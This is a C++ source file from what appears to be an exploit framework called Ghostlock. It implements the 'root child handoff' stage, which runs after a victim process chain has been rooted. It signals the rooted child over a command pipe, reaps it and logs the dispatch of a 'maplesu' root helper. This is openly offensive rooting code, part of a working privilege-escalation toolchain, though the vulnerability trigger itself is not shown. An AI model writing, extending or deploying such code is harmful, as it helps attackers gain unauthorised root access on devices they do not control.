// Derived from pinned Ghostlock session/root_child_frontend.cpp, Apache-2.0.
// Dispatch/anchor ownership is retained. App MJBL authentication, not module/log
// polling or this process exit code, decides whether a raw lease exists.
#include "session/root_child_frontend.hpp"
#include "attack/ops.hpp"
#include "session/exploit_session.hpp"
#include "support/run_state.hpp"
#include <cerrno>
#include <unistd.h>

namespace ghostlock::session::frontend {
StageResult RootChildPolicy::run(ExploitSession& session, const VictimChain& chain) {
    return run_root_child_handoff(session, chain);
}
StageResult run_root_child_handoff(ExploitSession& session, const VictimChain& chain) {
    auto& pipes = session.victim;
    usleep(session.profile.handoff_pre_dispatch_settle_ms() * 1000U);
    attack::timer_mark("provider stages complete");
    if (!chain.ever_rooted) return StageResult::Failed;
    ssize_t sent = -1;
    if (chain.child_alive) {
        const pid_t child = pipes.child();
        sent = write(pipes.cmd_write.get(), "G", 1);
        pipes.cmd_write.reset();
        waitpid(child, nullptr, WNOHANG);
        (void)pipes.release_child();
        session.parked_victim_cmd.reset();
    } else if (session.parked_victim > 0) {
        sent = write(session.parked_victim_cmd.get(), "G", 1);
        session.parked_victim_cmd.reset();
        waitpid(session.parked_victim, nullptr, WNOHANG);
    }
    pipes.uid_read.reset();
    if (sent != 1) {
        pr_warning("maplesu downstream dispatch failed errno=%d\n", errno);
        return StageResult::Failed;
    }
    pr_info("maplesu downstream dispatched; App lease verification pending\n");
    // Persist the dispatch fact before ACK lets this parent return. Its exit
    // is then independent of the detached worker's repair and helper lifetime.
    support::run_state::complete("maplesu_dispatch");
    return StageResult::Done;
}
}
